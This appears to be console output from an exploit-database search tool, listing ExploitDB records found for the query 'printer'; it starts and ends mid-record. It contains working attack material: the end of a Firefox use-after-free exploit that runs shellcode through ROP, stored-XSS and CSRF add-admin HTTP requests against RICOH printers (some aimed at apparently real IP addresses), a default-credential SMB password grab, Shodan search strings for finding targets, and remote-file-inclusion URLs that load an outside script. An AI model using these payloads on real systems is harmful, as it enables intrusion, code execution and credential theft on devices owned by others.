hijacked);\r\n\r\n    /* The first 4 bytes of the previously leaked [xul!nsHtml5Atoms::style]\r\n     * contain the address of xul!PermanentAtomImpl::`vftable\'.\r\n     *\r\n     * Note that the subtracted offset is specific to firefox 44.0.2.\r\n     * However, since we can read arbitrary memory by this point, the\r\n     * base of xul could easily (albeit perhaps somewhat slowly) be\r\n     * located by searching for a PE signature */\r\n    const xulBase = rwx.readDWord(addr) - 0x1c1f834;\r\n\r\n    log("style found at 0x" + addr.toString(16));\r\n    log("xul.dll found at 0x" + xulBase.toString(16));\r\n\r\n    const xulPE = new PortableExecutable(xulBase, rwx);\r\n    xulPE.read();\r\n    const rop = new ROPHelper(xulPE, rwx);\r\n    const kernel32 = new KERNEL32(rop, xulPE, rwx);\r\n    const kernel32handle = kernel32.GetModuleHandleA("kernel32.dll");\r\n    const kernel32PE = new PortableExecutable(kernel32handle, rwx);\r\n    kernel32PE.read();\r\n    const ntdll = new NTDLL(rop, kernel32PE, rwx);\r\n    const icuuc55 = new ICUUC55(rop, xulPE, rwx);\r\n\r\n    /*\r\n     * execute shellcode\r\n     */\r\n    const stack = ntdll.getStackLimit(kernel32.GetCurrentThread());\r\n    const exec = icuuc55.alloc(stack, shellcode.length);\r\n    const proc = xulPE.search("kernel32.dll", "GetProcAddress");\r\n    rwx.writeString(exec, shellcode.join(""));\r\n    rop.execute(exec, [kernel32handle, proc], true);\r\n};\r\n</script>\r\n</head>\r\n</html>', u'description': u"Mozilla Firefox < 45.0 - 'nsHtml5TreeBuilder' Use-After-Free (EMET 5.52 Bypass)", u'platform': u'windows', u'author': u'Hans Jerry Illikainen', u'cve': [u'CVE-2016-1960'], u'source': u'ExploitDB', u'date': u'2017-08-18T00:00:00+00:00', u'_id': 42484, u'type': u'remote', u'port': 0}

Searching for printer
=================================================================================
exploit search
=================================================================================
shellcode
=================================================================================
Unable to parse JSON response
Searching for printer
=================================================================================
exploit search
=================================================================================
 webapps
=================================================================================
Exploits found: 28
CVE: []
Description: RICOH MP C6503 Plus Printer - Cross-Site Scripting
{u'code': u'# Exploit Title: RICOH MP C6503 Plus Printer - Cross-Site Scripting\r\n# Date: 2018-09-21 \r\n# Exploit Author: Ismail Tasdelen\r\n# Vendor Homepage: https://www.ricoh.com/\r\n# Hardware Link: https://www.ricoh-usa.com/en/products/pd/equipment/printers-and-copiers/multifunction-printers-copiers/mp-c6503-plus-color-laser-multifunction-printer/_/R-SIG-C6503-PLU-SET\r\n# Software: RICOH Printer\r\n# Product Version:  MP C6503 Plus\r\n# Vulernability Type: Code Injection\r\n# Vulenrability: HTML Injection and Stored XSS\r\n# CVE: N/A\r\n\r\n# On the RICOH MP C6503 Plus printer, HTML Injection and Stored XSS vulnerabilities have been discovered \r\n# in the area of adding addresses via the entryNameIn parameter to /web/entry/en/address/adrsSetUserWizard.cgi.\r\n\r\n# HTTP POST Request :\r\n\r\nPOST /web/entry/en/address/adrsSetUserWizard.cgi HTTP/1.1\r\nHost: Target\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\r\nAccept: text/plain, */*\r\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://Target/web/entry/en/address/adrsList.cgi\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: 192\r\nCookie: risessionid=186737374338492; cookieOnOffChecker=on; wimsesid=205216910\r\nConnection: close\r\n\r\nmode=ADDUSER&step=BASE&wimToken=278155990&entryIndexIn=00018&entryNameIn=%22%3E%3Ch1%3EIsmail%3C%2Fh1%3E&entryDisplayNameIn=&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1', u'description': u'RICOH MP C6503 Plus Printer - Cross-Site Scripting', u'platform': u'hardware', u'author': u'Ismail Tasdelen', u'cve': [], u'source': u'ExploitDB', u'date': u'2018-09-25T00:00:00+00:00', u'_id': 45471, u'type': u'webapps', u'port': 0}

CVE: []
Description: RICOH MP C406Z Printer - Cross-Site Scripting
{u'code': u'# Exploit Title: RICOH MP C406Z Printer - Cross-Site Scripting\r\n# Date: 2018-09-21 \r\n# Exploit Author: Ismail Tasdelen\r\n# Vendor Homepage: https://www.ricoh.com/\r\n# Hardware Link: https://www.ricoh-usa.com/en/products/pd/equipment/printers-and-copiers/multifunction-printers-copiers/mp-c406-color-laser-multifunction-printer/_/R-417322\r\n# Software: RICOH Printer\r\n# Product Version:  MP C406Z\r\n# Vulernability Type: Code Injection\r\n# Vulenrability: HTML Injection and Stored XSS\r\n# CVE: N/A\r\n\r\n# On the RICOH MP C406Z printer, HTML Injection and Stored XSS vulnerabilities have been discovered \r\n# in the area of adding addresses via the entryNameIn parameter \r\n# to /web/entry/en/address/adrsSetUserWizard.cgi.\r\n\r\n# HTTP POST Request :\r\n\r\nPOST /web/entry/en/address/adrsSetUserWizard.cgi HTTP/1.1\r\nHost: 129.24.200.133\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\r\nAccept: text/plain, */*\r\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://129.24.200.133/web/entry/en/address/adrsList.cgi\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: 193\r\nCookie: risessionid=025838330540046; cookieOnOffChecker=on; wimsesid=655124944\r\nConnection: close\r\n\r\nmode=ADDUSER&step=BASE&wimToken=2029349348&entryIndexIn=00001&entryNameIn=%22%3E%3Ch1%3EIsmail%3C%2Fh1%3E&entryDisplayNameIn=&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1', u'description': u'RICOH MP C406Z Printer - Cross-Site Scripting', u'platform': u'hardware', u'author': u'Ismail Tasdelen', u'cve': [], u'source': u'ExploitDB', u'date': u'2018-09-25T00:00:00+00:00', u'_id': 45490, u'type': u'webapps', u'port': 0}

CVE: []
Description: Printer Pro 5.4.3 IOS - Persistent Cross-Site Scripting
{u'code': u'Document Title:\r\n===============\r\nPrinter Pro 5.4.3 IOS  - Cross Site Scripting \r\n\r\nCredits & Authors:\r\n==================\r\nTaurusOmar  - @TaurusOmar_ (taurusomar13@gmail.com) [taurusomar.blogspot.com]\r\n\r\nRelease Date:\r\n=============\r\n2015-08-11\r\n\r\n\r\nProduct & Service Introduction:\r\n===============================\r\nPrint attachments, documents, web pages and more right from your iPhone and iPad to any Wi-Fi or USB printer.\r\nPrinter Pro lets you wirelessly print from the iPhone or iPad. It can print directly to many Wi-Fi printers or any\r\nprinter attached to your Mac or PC via helper application installed on your computer.\r\nOnce installed, Printer Pro appears in the "Open In..." list on your device. This lets you print documents from Mail,\r\nPDF Expert and many other applications on your iPhone or iPad that support this function.\r\n\r\n(Copy of the Vendor Homepage: https://itunes.apple.com/us/app/printer-pro-print-documents/id393313223?mt=8)\r\n\r\n\r\nAbstract Advisory Information:\r\n==============================\r\nAn independent Vulnerability Laboratory researcher discovered multiple vulnerabilities in the official aplication  Printer Pro 5.4.3.\r\n\r\nVulnerability Disclosure Timeline:\r\n==================================\r\n2015-08-11:\tPublic Disclosure \r\n\r\n\r\nDiscovery Status:\r\n=================\r\nPublished\r\n\r\n\r\nAffected Product(s):\r\n====================\r\nReaddle\r\nProduct: Printer Pro 5.4.3 - iOS Mobile Application\r\n\r\n\r\nExploitation Technique:\r\n=======================\r\nLocal\r\n\r\n\r\nSeverity Level:\r\n===============\r\nLow\r\n\r\n\r\nTechnical Details & Description:\r\n================================\r\nAn application-side input validation  vulnerability has been discovered in the officialPrinter Pro 5.4.3 iOS mobile application.\r\nThe vulnerability allows a local attacker to inject own script code as payload to the application-side of the vulnerable service function or module.\r\nThe vulnerability exists in the TextBox Name contacts in which injects the code is activated When the application is opened and the contact containing \r\nthe script selects to print\r\nRequest Method(s):\r\n\t\t\t\t\t[+] Import\r\nVulnerable Module(s):\r\n\t\t\t\t\t[+] Add Contact\r\n\r\nVulnerable Parameter(s):\r\n\t\t\t\t\t[+] TextBox Name\r\n\r\nVulnerable Final(s):\r\n\t\t\t\t\t[+] Print Contact \t\t\t\t\t\r\n\r\n\r\nProof of Concept (PoC):\r\n=======================\r\nThe persistent input validation web vulnerability can be exploited by local attackers with system user account and without .\r\nFor security demonstration or to reproduce the security vulnerability follow the provided information and steps below to continue.\r\n\r\n1. Install the ios application ( https://itunes.apple.com/us/app/printer-pro-print-documents/id393313223?mt=8)\r\n2. Add new Contact with script in the TexBox Name \r\n2. Start the app and open the import function\r\n3. Select contact that contains the script\r\n4. Successful reproduce of the persistent vulnerability!\r\n\r\nProof of Concept (IMAGES):\r\n\r\n1. http://i.imgur.com/yku1o1c.jpg\r\n2. http://i.imgur.com/Q5O3X15.jpg\r\n3. http://i.imgur.com/uPhL9Ow.jpg\r\n\r\n\r\nPoC: Cross Site Scripting\r\n<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiVnVsbmVyYWJsZSIpOzwvc2NyaXB0Pg=="></object>\r\n\r\n\r\nSecurity Risk:\r\n==============\r\nThe security risk of the persistent input validation vulnerability in the name value is estimated as medium. (CVSS 3.7)', u'description': u'Printer Pro 5.4.3 IOS - Persistent Cross-Site Scripting', u'platform': u'ios', u'author': u'Taurus Omar', u'cve': [], u'source': u'ExploitDB', u'date': u'2015-08-12T00:00:00+00:00', u'_id': 37761, u'type': u'webapps', u'port': 0}

CVE: []
Description: RICOH MP C6003 Printer - Cross-Site Scripting
{u'code': u'# Exploit Title: RICOH MP C6003 Printer - Cross-Site Scripting\r\n# Date: 2018-09-21 \r\n# Exploit Author: Ismail Tasdelen\r\n# Vendor Homepage: https://www.ricoh.com/\r\n# Hardware Link: https://www.ricoh-usa.com/en/products/pd/equipment/printers-and-copiers/multifunction-printers-copiers/mp-c6003-color-laser-multifunction-printer/_/R-416534\r\n# Software: RICOH Printer\r\n# Product Version:  MP C6003\r\n# Vulernability Type: Code Injection\r\n# Vulenrability: HTML Injection and Stored XSS\r\n# CVE: N/A\r\n\r\n# On the RICOH MP C6003 printer, HTML Injection and Stored XSS vulnerabilities have been \r\n# discovered in the area of adding addresses via the entryNameIn parameter \r\n# to /web/entry/en/address/adrsSetUserWizard.cgi.\r\n\r\n# HTTP POST Request :\r\n\r\nPOST /web/entry/en/address/adrsSetUserWizard.cgi HTTP/1.1\r\nHost: TARGET\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\r\nAccept: text/plain, */*\r\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://TARGET/web/entry/en/address/adrsList.cgi\r\nContent-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: 191\r\nCookie: risessionid=136092287407915; cookieOnOffChecker=on; wimsesid=201698077\r\nConnection: close\r\n\r\nmode=ADDUSER&step=BASE&wimToken=71325138&entryIndexIn=00031&entryNameIn=%22%3E%3Ch1%3EIsmail%3C%2Fh1%3E&entryDisplayNameIn=&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1', u'description': u'RICOH MP C6003 Printer - Cross-Site Scripting', u'platform': u'hardware', u'author': u'Ismail Tasdelen', u'cve': [], u'source': u'ExploitDB', u'date': u'2018-09-24T00:00:00+00:00', u'_id': 45460, u'type': u'webapps', u'port': 80}

CVE: [u'CVE-2018-15884']
Description: RICOH MP C4504ex Printer - Cross-Site Request Forgery (Add Admin)
{u'code': u'# Exploit Title: RICOH MP C4504ex Printer - Cross-Site Request Forgery (Add Admin)\r\n# Date: 2018-08-21 \r\n# Exploit Author: Ismail Tasdelen\r\n# Vendor Homepage: https://www.ricoh.com/\r\n# Hardware Link : https://www.ricoh-usa.com/en/products/pd/equipment/printers-and-copiers/multifunction-printers-copiers/mp-c4504ex-color-laser-multifunction-printer/_/R-417998\r\n# Software : RICOH Printer\r\n# Product Version:  MP C4504ex\r\n# Vulernability Type : Code Injection\r\n# Vulenrability : HTML Injection\r\n# CVE : CVE-2018-15884\r\n\r\n# CSRF vulnerability has been discovered on the printer of MP C4504ex of RICOH product.\r\n# Low priviliage users are able to create administrator accounts\r\n\r\nHTTP POST Request :\r\n\r\nPOST /web/entry/en/address/adrsSetUserWizard.cgi HTTP/1.1\r\nHost: 192.168.0.10\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\nAccept: text/plain, */*\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://192.168.0.10/web/entry/en/address/adrsList.cgi\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: 193\r\nCookie: risessionid=132072532817225; cookieOnOffChecker=on; wimsesid=103007361\r\nConnection: close\r\n\r\nmode=ADDUSER&step=BASE&wimToken=2051165463&entryIndexIn=00007&entryNameIn=%22%3E%3Ch1%3EIsmail%3C%2Fh1%3E&entryDisplayNameIn=&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1\r\n\r\nHTTP Response Request :\r\n\r\nGET /success.txt HTTP/1.1\r\nHost: detectportal.firefox.com\r\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\nAccept: */*\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nConnection: close', u'description': u'RICOH MP C4504ex Printer - Cross-Site Request Forgery (Add Admin)', u'platform': u'hardware', u'author': u'Ismail Tasdelen', u'cve': [u'CVE-2018-15884'], u'source': u'ExploitDB', u'date': u'2018-08-27T00:00:00+00:00', u'_id': 45264, u'type': u'webapps', u'port': 80}

CVE: []
Description: RICOH Aficio MP 301 Printer - Cross-Site Scripting
{u'code': u'# Exploit Title: RICOH Aficio MP 301 Printer - Cross-Site Scripting\r\n# Date: 2018-09-21 \r\n# Exploit Author: Ismail Tasdelen\r\n# Vendor Homepage: https://www.ricoh.com/\r\n# Hardware Link: https://www.ricoh-usa.com/en/products/pd/equipment/printers-and-copiers/multifunction-printers-copiers/mp-301spf-black-and-white-laser-multifunction-printer/_/R-416185\r\n# Software: RICOH Printer\r\n# Product Version:  Aficio MP 301\r\n# Vulernability Type: Code Injection\r\n# Vulenrability: HTML Injection and Stored XSS\r\n# CVE: N/A\r\n\r\n# On the RICOH Aficio MP 301 printer, HTML Injection and Stored XSS vulnerabilities have been \r\n# discovered in the area of adding addresses via the entryNameIn parameter \r\n# to /web/entry/en/address/adrsSetUserWizard.cgi.\r\n\r\n# HTTP POST Request :\r\n\r\nPOST /web/entry/en/address/adrsSetUserWizard.cgi HTTP/1.1\r\nHost: 138.100.78.33\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\r\nAccept: text/plain, */*\r\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://138.100.78.33/web/entry/en/address/adrsList.cgi\r\nContent-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: 192\r\nCookie: risessionid=082172179372966; cookieOnOffChecker=on; wimsesid=163487735\r\nConnection: close\r\n\r\nmode=ADDUSER&step=BASE&wimToken=507435387&entryIndexIn=00038&entryNameIn=%22%3E%3Ch1%3EIsmail%3C%2Fh1%3E&entryDisplayNameIn=&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1', u'description': u'RICOH Aficio MP 301 Printer - Cross-Site Scripting', u'platform': u'hardware', u'author': u'Ismail Tasdelen', u'cve': [], u'source': u'ExploitDB', u'date': u'2018-09-24T00:00:00+00:00', u'_id': 45454, u'type': u'webapps', u'port': 80}

CVE: []
Description: RICOH MP C2003 Printer - Cross-Site Scripting
{u'code': u'# Exploit Title: RICOH MP C2003 Printer - Cross-Site Scripting\r\n# Date: 2018-09-21 \r\n# Exploit Author: Ismail Tasdelen\r\n# Vendor Homepage: https://www.ricoh.com/\r\n# Hardware Link : https://www.ricoh.ca/en/products/pd/mp-c2003-color-laser-multifunction-printer/_/R-240-417253\r\n# Software : RICOH Printer\r\n# Product Version:  MP C2003\r\n# Vulernability Type : Code Injection\r\n# Vulenrability : HTML Injection and Stored XSS\r\n# CVE : N/A\r\n\r\n# On the MP C2003 printer, HTML Injection and Stored XSS vulnerabilities have been discovered in \r\n# the area of adding addresses via the entryNameIn parameter \r\n# to /web/entry/en/address/adrsSetUserWizard.cgi.\r\n\r\n# HTTP POST Request :\r\n\r\nPOST /web/entry/en/address/adrsSetUserWizard.cgi HTTP/1.1\r\nHost: 134.96.209.202\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\r\nAccept: text/plain, */*\r\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://134.96.209.202/web/entry/en/address/adrsList.cgi\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: 193\r\nCookie: risessionid=028553667951828; cookieOnOffChecker=on; wimsesid=552487526\r\nConnection: close\r\n\r\nmode=ADDUSER&step=BASE&wimToken=1581082599&entryIndexIn=00005&entryNameIn=%22%3E%3Ch1%3EIsmail%3C%2Fh1%3E&entryDisplayNameIn=&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1', u'description': u'RICOH MP C2003 Printer - Cross-Site Scripting', u'platform': u'hardware', u'author': u'Ismail Tasdelen', u'cve': [], u'source': u'ExploitDB', u'date': u'2018-09-25T00:00:00+00:00', u'_id': 45461, u'type': u'webapps', u'port': 0}

CVE: []
Description: RICOH MP 305+ Printer - Cross-Site Scripting
{u'code': u'# Exploit Title: RICOH MP 305+ Printer - Cross-Site Scripting\r\n# Date: 2018-09-21 \r\n# Exploit Author: Ismail Tasdelen\r\n# Vendor Homepage: https://www.ricoh.com/\r\n# Hardware Link: https://www.ricoh-europe.com/products/office-printers-fax/all-in-one-printers/mp-305sp.html\r\n# Software: RICOH Printer\r\n# Product Version:  MP 305+, MP C1803 JPN, MP C6503 Plus, MP C307\r\n# Vulernability Type: Code Injection\r\n# Vulenrability: HTML Injection and Stored XSS\r\n# CVE:\r\n\r\n# On the RICOH Aficio MP 305+ printer and other affected models, HTML Injection and Stored XSS \r\n# vulnerabilities have been discovered in the area of adding addresses via the entryNameIn \r\n# parameter to /web/entry/en/address/adrsSetUserWizard.cgi.\r\n\r\n# HTTP POST Request :\r\n\r\nPOST /web/entry/en/address/adrsSetUserWizard.cgi HTTP/1.1\r\nHost: Target\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\r\nAccept: text/plain, */*\r\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://Target/web/entry/en/address/adrsList.cgi\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: 193\r\nCookie: risessionid=125043496912702; cookieOnOffChecker=on; wimsesid=182442825\r\nConnection: close\r\n\r\nmode=ADDUSER&step=BASE&wimToken=2128826648&entryIndexIn=00002&entryNameIn=%22%3E%3Ch1%3EIsmail%3C%2Fh1%3E&entryDisplayNameIn=&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1', u'description': u'RICOH MP 305+ Printer - Cross-Site Scripting', u'platform': u'hardware', u'author': u'Ismail Tasdelen', u'cve': [], u'source': u'ExploitDB', u'date': u'2018-09-25T00:00:00+00:00', u'_id': 45487, u'type': u'webapps', u'port': 0}

CVE: [u'CVE-2018-17310', u'CVE-2018-17313']
Description: RICOH MP C1803 JPN Printer - Cross-Site Scripting
{u'code': u'# Exploit Title: RICOH MP C1803 JPN Printer - Cross-Site Scripting\r\n# Date: 2018-09-21 \r\n# Exploit Author: Ismail Tasdelen\r\n# Vendor Homepage: https://www.ricoh.com/\r\n# Hardware Link : https://www.ricoh.co.jp/mfp/mp_c/1803/\r\n# Software : RICOH Printer\r\n# Product Version:  MP C1803 JPN\r\n# Vulernability Type : Code Injection\r\n# Vulenrability : HTML Injection and Stored XSS\r\n# Affected Products: RICOH MP C1803 JPN, RICOH MP C307\r\n# CVE : CVE-2018-17310, CVE-2018-17313\r\n\r\n# On the RICOH MP C1803 JPN printer, HTML Injection and Stored XSS vulnerabilities have \r\n# been discovered in the area of adding addresses via the entryNameIn parameter to /web/entry/en/address/adrsSetUserWizard.cgi.\r\n\r\n# HTTP POST Request :\r\n\r\nPOST /web/entry/en/address/adrsSetUserWizard.cgi HTTP/1.1\r\nHost: Target\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:62.0) Gecko/20100101 Firefox/62.0\r\nAccept: text/plain, */*\r\nAccept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3\r\nAccept-Encoding: gzip, deflate\r\nReferer: http://Target/web/entry/en/address/adrsList.cgi\r\nContent-Type: application/x-www-form-urlencoded; charset=UTF-8\r\nX-Requested-With: XMLHttpRequest\r\nContent-Length: 209\r\nCookie: risessionid=125831398474617; cookieOnOffChecker=on; wimsesid=911065987\r\nConnection: close\r\n\r\nmode=ADDUSER&step=BASE&wimToken=847703007&entryIndexIn=00002&entryNameIn=%22%3E%3Ch1%3EIsmail%3C%2Fh1%3E&entryReadNameIn=&entryDisplayNameIn=&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1&entryTagInfoIn=1', u'description': u'RICOH MP C1803 JPN Printer - Cross-Site Scripting', u'platform': u'hardware', u'author': u'Ismail Tasdelen', u'cve': [u'CVE-2018-17310', u'CVE-2018-17313'], u'source': u'ExploitDB', u'date': u'2018-10-03T00:00:00+00:00', u'_id': 45526, u'type': u'webapps', u'port': 0}

CVE: []
Description: Samsung SyncThruWeb 2.01.00.26 - SMB Hash Disclosure
{u'code': u'# Exploit Title: Samsung SyncThruWeb SMB Hash Disclosure\r\n\r\n# Date: 8/28/15\r\n\r\n# Exploit Author: Shad Malloy\r\n\r\n# Contact: http://twitter.com/SecureNM\r\n\r\n# Website: https://securenetworkmanagement.com\r\n\r\n# Vendor Homepage: http://www.samsung.com \r\n\r\n# Software Link:\r\nhttp://www.samsung.com/hk_en/consumer/solutions/type/SyncThruWebService.html\r\n\r\n# Version: Known Vulnerable versions   Samsung SCX-5835_5935 Series Printer\r\nMain Firmware Version : 2.01.00.26  \r\n\r\nSamsung SCX-5635 Series Printer Main Firmware Version : 2.01.01.18\r\n12-08-2009 \r\n\r\n \r\n\r\n# Tested on: \r\n\r\n  Samsung SCX-5835_5935 Series Printer\r\n\r\n                Main Firmware Version :  2.01.00.26  \r\n\r\n                Network Firmware Version :  V4.01.05(SCX-5835/5935)\r\n12-22-2008  \r\n\r\n                Engine Firmware Version :  1.20.73  \r\n\r\n                UI Firmware Version :  V1.03.01.55 07-13-2009  \r\n\r\n                Finisher Firmware Version :  Not Installed  \r\n\r\n                PCL5E Firmware Version : PCL5e 5.87 11-07-2008  \r\n\r\n                 PCL6 Firmware Version : PCL6 5.86 10-28-2008  \r\n\r\n                PostScript Firmware Version : PS3 V1.93.06 12-19-2008  \r\n\r\n                SPL Firmware Version : SPL 5.32 01-03-2008  \r\n\r\n                TIFF Firmware Version : TIFF 0.91.00 10-07-2008\r\n\r\nSamsung SCX-5635 Series\r\n\r\n                   Main Firmware Version :           2.01.01.18 12-08-2009 \r\n\r\n                Network Firmware Version :       V4.01.16(SCX-5635)\r\n12-04-2009 \r\n\r\n                Engine Firmware Version :           1.31.32 \r\n\r\n                PCL5E Firmware Version :             PCL5e 5.92 02-12-2009\r\n\r\n\r\n                PCL6 Firmware Version :               PCL6 5.93 03-21-2009\r\n\r\n\r\n                PostScript Firmware Version :    PS3 1.94.06 12-22-2008 \r\n\r\n                TIFF Firmware Version : TIFF 0.91.00 10-07-2008\r\n\r\n \r\n\r\nProof of Concept\r\n\r\n1.            Using the default username and password (admin/admin), it is\r\npossible to obtain all credentials used for SMB file transfer. To obtain the\r\nfile access http://<printer url>/smb_serverList.csv.\r\n\r\n2.            The UserName and UserPassword fields are unencrypted and\r\nvisible using any text editor.\r\n\r\n \r\n\r\nRelevant Patches\r\n\r\nhttp://downloadcenter.samsung.com/content/FM/201508/20150825111208555/SCX563\r\n5_V2.01.01.28_0401113_1.00.zip\r\n\r\nhttp://downloadcenter.samsung.com/content/FM/201508/20150825112233867/SCX583\r\n5_5935_V2.01.00.56_0401113_1.01.zip\r\n\r\n \r\n\r\nShad Malloy\r\n\r\nSecure Network Management, LLC', u'description': u'Samsung SyncThruWeb 2.01.00.26 - SMB Hash Disclosure', u'platform': u'hardware', u'author': u'Shad Malloy', u'cve': [], u'source': u'ExploitDB', u'date': u'2015-08-29T00:00:00+00:00', u'_id': 38004, u'type': u'webapps', u'port': 80}

CVE: []
Description: Planex Mini-300PU & Mini100s - Cross-Site Scripting
{u'code': u'GotGeek Labs\r\nhttp://www.gotgeek.com.br/\r\n\r\nPlanex Mini-300PU & Mini100s Cross-site Scripting Vulnerability\r\n\r\n\r\n\r\n[+] Description\r\n\r\nMini-300PU:\r\nThe PLANEX Mini-300PU is the greatest network printing solution to both\r\nUSB and Parallel printer ports. It provides 2 USB 2.0 and 1 Parallel printer\r\nports, which can work with 3 printers at the same time.\r\nYou could share multiple printers with your network clients in your office\r\nor at home with different O/S Base, including Windows 2000/XP, Linux, and Mac OS 8.1,\r\nor even higher: Unix, Netware. PLANEX Mini-300PU Printer Server is your best choice.\r\n\r\nMini100s:\r\nThe Mini100s parallel port print server directly attaches to a printer. The\r\nprint server supports IPP, and even a network beginner can set up the product\r\nwith ease via the supplied configuration utility for Windows "Smart Print Manager 3".\r\n\r\n\r\n\r\n[+] Information\r\n\r\nTitle: Planex Mini-300PU & Mini100s Cross-site Scripting Vulnerability\r\nShodan Dork: ZOT-PS-39/6.2.0001 -WWW-Authenticate\r\n             ZOT-PS-30/8.3.0013 -WWW-Authenticate\r\nAdvisory: gg-008-2011\r\nDate: 03-15-2011\r\nLast update: 03-26-2011\r\nLink: http://www.gotgeek.com.br/pocs/gg-008-2011.txt\r\n\r\n\r\n\r\n[+] Vulnerabilities\r\n\r\nStored Cross-site Scripting:\r\nWeb interface from Mini-300PU and Mini100s Print Servers are affected by stored\r\ncross-site scripting vulnerability because it fails to properly sanitize\r\nuser-supplied input at "NDSContext" field in "NetWare NDS Settings" area.\r\nAn attacker may leverage this issue to execute arbitrary script code\r\nin the browser of an unsuspecting user in the context of the affected site.\r\n\r\nAfter injecting the XSS code, you need to access Netware status page.\r\n\r\n\r\nAffected Versions:\r\n\r\nPlanex Mini-300PU Print Server\r\nFirmware: 6.02.39P (ZOT-PS-39/6.2.0001)\r\n\r\nPlanex Mini100s Print Server\r\nFirmware: 8.03.30P 0013 (ZOT-PS-30/8.3.0013)\r\n\t  8.03.30P 0007 (ZOT-PS-30/8.3.0007)\r\n\r\nOther versions may also be vulnerable.\r\n\r\n\r\n\r\n[+] Proof of Concept/Exploit\r\n\r\nXSS:\r\nhttp://target/RESTART.HTM?NDSContext=</script><script>alert("xss")</script><script>\r\n\r\nand then..\r\n\r\nhttp://target/NETWARE.HTM\r\n\r\n\r\n\r\n[+] Timeline\r\n\r\n24-03-2011: first contact to vendor.\r\n25-03-2011: support contact response, asking more details.\r\n27-03-2011: more information sent.\r\n03-04-2011: no vendor response.\r\n04-04-2011: advisory published.\r\n\r\n\r\n\r\n[+] References\r\n\r\nhttp://www.planex.net/product/print/mini-300pu.htm\r\nhttp://www.planex.net/product/print/mini100s.htm\r\n\r\n\r\n\r\n[+] Credits\r\n\r\nb0telh0', u'description': u'Planex Mini-300PU & Mini100s - Cross-Site Scripting', u'platform': u'hardware', u'author': u'b0telh0', u'cve': [], u'source': u'ExploitDB', u'date': u'2011-04-04T00:00:00+00:00', u'_id': 17114, u'type': u'webapps', u'port': 0}

CVE: []
Description: dotWidget CMS 1.0.6 - 'file_path' Remote File Inclusion
{u'code': u'Title: dotWidget CMS <= 1.0.6 - Remote File Include Vulnerability\r\n-----------------------------------------------------------------\r\nVendor: dotWidget\r\nURL: http://dotwigdet.com\r\n-----------------------------------------------------------------\r\n\r\nCredits:\r\nDiscovered by: \'Aesthetico\'\r\nhttp://www.majorsecurity.de\r\n-----------------------------------------------------------------\r\nSearch for: "dotwidget Printer-friendly"\r\n-----------------------------------------------------------------\r\n\r\nExploitation:\r\n\r\n/index.php?file_path=http://www.yourspace.com/yourscript.php?\r\n/feedback.php?file_path=http://www.yourspace.com/yourscript.php?\r\n/printfriendly.php?file_path=http://www.yourspace.com/yourscript.php?\r\n\r\nEvilCookie <dorshirl[at]zahav.net.il> submitted these extra file_path issues.\r\n\r\n/includes/common.inc?file_path=http://www.yourspace.com/yourscript.php?\r\n/includes/nav.inc?file_path=http://www.yourspace.com/yourscript.php?\r\n/admin/dotwidgetc_config.php?file_path=http://www.yourspace.com/yourscript.php?\r\n\r\n# milw0rm.com 